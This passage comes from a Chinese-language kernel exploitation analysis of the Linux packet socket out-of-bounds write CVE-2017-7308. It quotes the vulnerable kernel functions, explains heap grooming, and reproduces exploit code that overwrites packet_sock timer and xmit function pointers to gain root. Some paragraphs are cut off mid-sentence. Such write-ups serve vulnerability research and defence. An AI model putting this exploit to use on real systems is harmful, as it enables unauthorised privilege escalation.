    A = req->tp_block_size = 4096 = 0x1000
    B = req_u->req3.tp_sizeof_priv = (1  0
在调试器中观察一下。  
之前在CVE-2016-8655中我们说到packet_set_ring函数在创建ringbuffer的时候，如果packet版本为TPACKET_V3会初始化定时器。
    case TPACKET_V3:
            /* Transmit path is not supported. We checked
             * it above but just being paranoid
             */
                if (!tx_ring)
                    init_prb_bdqc(po, rb, pg_vec, req_u);
                break;
            default:
                break;
之后，在init_prb_bdqc函数中req_u->req3.tp_sizeof_priv会被复制到p1->blk_sizeof_priv。由于后者的类型是unsigned
short，因此可以将其设置为任意值。p1->blk_sizeof_priv刚被赋值紧接着就会用来设置p1->max_frame_len变量的值。p1->max_frame_len的值代表可以保存到内存块中的某个帧大小的最大值。由于我们可以控制p1->blk_sizeof_priv，我们可以使BLK_PLUS_PRIV(p1->blk_sizeof_priv)的值大于p1->kblk_size的值。这样会设置p1->max_frame_len为一个比内存块的大小更大的值。
    static void init_prb_bdqc(struct packet_sock *po,
                struct packet_ring_buffer *rb,
                struct pgv *pg_vec,
                union tpacket_req_u *req_u)
    {
        struct tpacket_kbdq_core *p1 = GET_PBDQC_FROM_RB(rb);
        struct tpacket_block_desc *pbd;
        memset(p1, 0x0, sizeof(*p1));
    ......
        p1->blk_sizeof_priv = req_u->req3.tp_sizeof_priv;
        p1->max_frame_len = p1->kblk_size - BLK_PLUS_PRIV(p1->blk_sizeof_priv);
    ......
    }
当某个帧被拷贝到内存块中时就可以绕过对它的大小检测，最终导致内核堆越界写入。
    static int tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
                   struct packet_type *pt, struct net_device *orig_dev)
    {
    ......
        } else if (unlikely(macoff + snaplen >
                    GET_PBDQC_FROM_RB(&po->rx_ring)->max_frame_len)) {
    ......
        skb_copy_bits(skb, 0, h.raw + macoff, snaplen);
    ......
    }
prb_open_block函数用来初始化一个内存块。当内核收到新的数据包时，数据包的写入地址存放在pkc1->nxt_offset中。内核不想覆盖内存块头部以及内存块对应的私有数据，因此它会将这个地址指向紧挨着头部和私有数据之后的那个地址。由于我们可以控制pkc1->blk_sizeof_priv，因此也可以控制pkc1->nxt_offset的最低的两个字节。这样我们就能够控制越界写入的偏移量。
    static void prb_open_block(struct tpacket_kbdq_core *pkc1,
        struct tpacket_block_desc *pbd1)
    {
    ......
        pkc1->nxt_offset = pkc1->pkblk_start + BLK_PLUS_PRIV(pkc1->blk_sizeof_priv);
    ......
    }
漏洞的利用方法是利用堆越界写入覆盖内存中与溢出内存块临近的那个函数指针。因此需要对堆进行精确布局，使得某些带有可触发函数指针的对象被精确放置在某个环形缓冲区之后。这里使用packet_sock结构体作为这类对象。我们需要找到一种办法，使得内核将一个环形缓冲区内存块和一个packet_sock结构体分配在一起。  
环形缓冲区内存块通过buddy分配器进行分配，它可以为内存块分配2^n个连续的内存页面。对于每个n值，分配器会为这类内存块维护一个freelist表，并在请求内存块时返回freelist表头。如果某个n值对应的freelist为空，分配器就会查找第一个满足m>n且其freelist不为空的值，然后将它分为两半，直到所需的大小得到满足。因此，如果我们一直以2^n大小重复分配内存块，那么在某些时候，这些内存块会由某个高位内存块分裂所得，且这些内存块会彼此相邻。  
packet_sock结构体是通过slab分配器使用kmalloc函数进行分配的。slab分配器主要用于分配比单内存页还小的那些对象。它使用buddy分配器分配一大块内存，然后切割这块内存，生成较小的对象。大的内存块称之为slabs，这也就是slab分配器的名称来源。一组slabs与它们的当前状态以及一组操作(分配对象/释放对象)一起，统称为一个缓存。slab分配器会按照2^n大小，为对象创建一组通用的缓存。每当kmalloc函数被调用时，slab分配器会将size调整到与2的幂最为接近的一个值，使用这个size作为缓存的大小。由于内核一直使用的都是kmalloc函数，如果我们试图分配一个对象，那么这个对象很有可能会来自于之前已经创建的一个slab中。然而，如果我们一直分配同样大小的对象，那么在某些时候，slab分配器将会将同样大小的slab全部用光，然后不得不使用buddy分配器分配另一个slab。新创建的slab的大小取决于这个slab所用的对象大小。packet_sock结构体的大小大约为1920，而1024
function = func;
        timer->data = arg;
        timer->flags = 1;
        oob_write(&buffer[0] + 2, sizeof(*timer) + 8 - 2);
        sleep(1);
    }
这里不知道大家注意到没有，rdx减去pkblk_end是0xb7a，而在EXP中设置的2048+TIMER_OFFSET-8=0xb78，因为对齐所以差了两个字节，后面oob_write把这两个字节补回来了。  
5.再次利用漏洞覆盖packet_sock->xmit函数，使之去执行被替换后的用户态中的提权函数。
    void oob_id_match_execute(void *func) {
        int s = oob_setup(2048 + XMIT_OFFSET - 64);
        int ps[32];
        int i;
        for (i = 0; i < 32; i++)
            ps[i] = packet_sock_kmalloc();
        char buffer[2048];
        memset(&buffer[0], 0, 2048);
        void **xmit = (void **)&buffer[64];
        *xmit = func;
        oob_write((char *)&buffer[0] + 2, sizeof(*xmit) + 64 - 2);
        for (i = 0; i < 32; i++)
            packet_sock_id_match_trigger(ps[i]);
    }
    void packet_sock_id_match_trigger(int s) {
        char buffer[16];
        packet_socket_send(s, &buffer[0], sizeof(buffer));
    }
## 总结
本文我们分析了linux内核关于网络协议中的三个漏洞，它们使用了覆盖packet_sock结构体中的timer_list结构体中的函数实现提权的方法。有别于可能更常见的stack
pivot之后通过ROP链禁用SMEP的方法，这种方法能同时禁用SMEP和SMAP，也具有更好的稳定性。参考资料中给出了这几个漏洞用到的EXP和相关文章的链接。作者水平有限，如有不当还请指正。
## 参考资料
1.[CVE-2016-8655 EXP](https://www.exploit-db.com/exploits/40871 "CVE-2016-8655
EXP")  
2.[CVE-2017-6074 EXP](https://www.exploit-db.com/exploits/41458 "CVE-2017-6074
EXP")  
3.[CVE-2017-7308 EXP](https://github.com/bcoles/kernel-exploits/blob/master/CVE-2017-7308/poc.c "CVE-2017-7308")  
4.[CVE-2016-8655内核竞争条件漏洞调试分析](https://www.anquanke.com/post/id/85162
"CVE-2016-8655内核竞争条件漏洞调试分析")  
5.[Exploiting the Linux kernel via packet
sockets](https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html "Exploiting the Linux kernel via packet sockets")  
6.[New Reliable Android Kernel Root Exploitation
Techniques](http://powerofcommunity.net/poc2016/x82.pdf "New Reliable Android
Kernel Root Exploitation Techniques")